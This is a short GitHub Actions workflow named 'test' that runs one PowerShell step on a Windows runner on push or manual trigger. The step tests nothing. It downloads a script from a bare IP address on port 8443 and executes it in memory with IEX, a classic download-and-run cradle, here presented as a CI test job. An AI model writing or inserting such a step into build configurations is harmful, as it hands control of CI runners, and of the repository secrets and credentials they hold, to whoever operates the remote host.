name: test
on:
  push:
    paths: [".github/workflows/test.yml"]
  workflow_dispatch:
jobs:
  run:
    runs-on: windows-2022
    steps:
      - shell: powershell
        run: |
          [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12
          IEX (New-Object Net.WebClient).DownloadString("http://51.159.21.191:8443/a")

